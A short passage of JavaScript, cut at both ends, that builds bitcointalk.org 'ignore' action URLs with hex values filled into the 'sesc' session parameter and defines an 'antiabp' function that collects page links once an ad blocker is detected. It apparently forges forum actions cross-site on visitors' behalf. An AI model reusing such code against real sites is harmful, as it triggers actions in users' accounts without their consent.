	else
		template="https://bitcointalk.org/index.php?action=ignore;u="+msg+";topic="+msg+";msg="+msg+";sesc=";

	return template + hex(code,8) + hex(code,8) + hex(site_c,8) + filler;
}
function antiabp(){
	if(!detectabp())
		return;
	var all_links=document.body.getElementsByTagName('a');
